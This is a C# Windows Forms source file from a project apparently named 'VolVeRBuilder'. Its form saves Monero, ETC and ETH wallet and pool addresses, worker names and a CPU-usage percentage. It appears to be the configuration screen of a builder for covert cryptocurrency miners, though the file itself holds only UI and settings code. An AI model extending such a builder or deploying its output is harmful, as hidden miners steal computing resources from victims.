using System;
using System.Drawing;
using System.Windows.Forms;

namespace VolVeRBuilder.Forms.Build
{
    

    public partial class Wallets : Form
    {
 


        public Wallets()
        {
            InitializeComponent();
            

        }
        private void textBox1_Leave(object sender, EventArgs e)
        {
            if (textBox1.Text.Length == 0)
            {
                textBox1.Text = "Your Monero Wallet Adderss";
                textBox1.ForeColor = Color.Gray;
            }
            if (textBox2.Text.Length == 0)
            {
                textBox2.Text = "Your Monero Pool Adderss";
                textBox2.ForeColor = Color.Gray;
            }
            if (textBox3.Text.Length == 0)
            {
                textBox3.Text = "Your Monero Usage (Standard 25)";
                textBox3.ForeColor = Color.Gray;
            }
            if (textBox13.Text.Length == 0)
            {
                textBox13.Text = "Your ETC Wallet Adderss";
                textBox13.ForeColor = Color.Gray;
            }
            if (textBox14.Text.Length == 0)
            {
                textBox14.Text = "Your ETC Pool Adderss";
                textBox14.ForeColor = Color.Gray;
            }
            if (textBox4.Text.Length == 0)
            {
                textBox4.Text = "Your ETC Worker Name";
                textBox4.ForeColor = Color.Gray;
            }
            if (textBox7.Text.Length == 0)
            {
                textBox7.Text = "Your ETH Wallet Adderss";
                textBox7.ForeColor = Color.Gray;
            }
            if (textBox8.Text.Length == 0)
            {
                textBox8.Text = "Your ETH Pool Adderss";
                textBox8.ForeColor = Color.Gray;
            }
            if (textBox9.Text.Length == 0)
            {
                textBox9.Text = "Your ETH Worker Name";
                textBox9.ForeColor = Color.Gray;
            }
        }

        private void Wallets_Load(object sender, EventArgs e)
        {
            textBox1.Text = Properties.Settings.Default.Wallet1;
            textBox2.Text = Properties.Settings.Default.Wallet2;
            textBox3.Text = Properties.Settings.Default.Wallet3;
            textBox4.Text = Properties.Settings.Default.Wallet4;
            textBox14.Text = Properties.Settings.Default.Wallet5;
            textBox13.Text = Properties.Settings.Default.Wallet6;
            textBox7.Text = Properties.Settings.Default.Wallet7;
            textBox8.Text = Properties.Settings.Default.Wallet8;
            textBox9.Text = Properties.Settings.Default.Wallet9;
            this.textBox1.Leave += new System.EventHandler(this.textBox1_Leave);
            this.textBox2.Leave += new System.EventHandler(this.textBox1_Leave);
            this.textBox3.Leave += new System.EventHandler(this.textBox1_Leave);
            this.textBox13.Leave += new System.EventHandler(this.textBox1_Leave);
            this.textBox14.Leave += new System.EventHandler(this.textBox1_Leave);
            this.textBox4.Leave += new System.EventHandler(this.textBox1_Leave);
            this.textBox7.Leave += new System.EventHandler(this.textBox1_Leave);
            this.textBox8.Leave += new System.EventHandler(this.textBox1_Leave);
            this.textBox9.Leave += new System.EventHandler(this.textBox1_Leave);
            if (textBox1.Text.Length == 0)
            {
                textBox1.Text = "Your Monero Wallet Adderss";
                textBox1.ForeColor = Color.Gray;
            }
            if (textBox2.Text.Length == 0)
            {
                textBox2.Text = "Your Monero Pool Adderss";
                textBox2.ForeColor = Color.Gray;
            }
            if (textBox3.Text.Length == 0)
            {
                textBox3.Text = "Your Monero Usage (Standard 25)";
                textBox3.ForeColor = Color.Gray;
            }
            if (textBox13.Text.Length == 0)
            {
                textBox13.Text = "Your ETC Wallet Adderss";
                textBox13.ForeColor = Color.Gray;
            }
            if (textBox14.Text.Length == 0)
            {
                textBox14.Text = "Your ETC Pool Adderss";
                textBox14.ForeColor = Color.Gray;
            }
            if (textBox4.Text.Length == 0)
            {
                textBox4.Text = "Your ETC Worker Name";
                textBox4.ForeColor = Color.Gray;
            }
            if (textBox7.Text.Length == 0)
            {
                textBox7.Text = "Your ETH Wallet Adderss";
                textBox7.ForeColor = Color.Gray;
            }
            if (textBox8.Text.Length == 0)
            {
                textBox8.Text = "Your ETH Pool Adderss";
                textBox8.ForeColor = Color.Gray;
            }
            if (textBox9.Text.Length == 0)
            {
                textBox9.Text = "Your ETH Worker Name";
                textBox9.ForeColor = Color.Gray;
            }

        }


        private void FormIsClosing(object sender, FormClosingEventArgs e)
        {
            Properties.Settings.Default.Wallet1 = textBox1.Text;
            Properties.Settings.Default.Wallet2 = textBox2.Text;
            Properties.Settings.Default.Wallet3 = textBox3.Text;
            Properties.Settings.Default.Wallet4 = textBox4.Text;
            Properties.Settings.Default.Wallet5 = textBox14.Text;
            Properties.Settings.Default.Wallet6 = textBox13.Text;
            Properties.Settings.Default.Wallet7 = textBox7.Text;
            Properties.Settings.Default.Wallet8 = textBox8.Text;
            Properties.Settings.Default.Wallet9 = textBox9.Text;
            Properties.Settings.Default.Save();


        }
 

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void trackBar1_Scroll(object sender, EventArgs e)
        {
            textBox3.Text = trackBar1.Value.ToString();
            trackBar1.Maximum = 100;
            trackBar1.Minimum = 10;
            trackBar1.TickFrequency = 10;
        }
    }
}
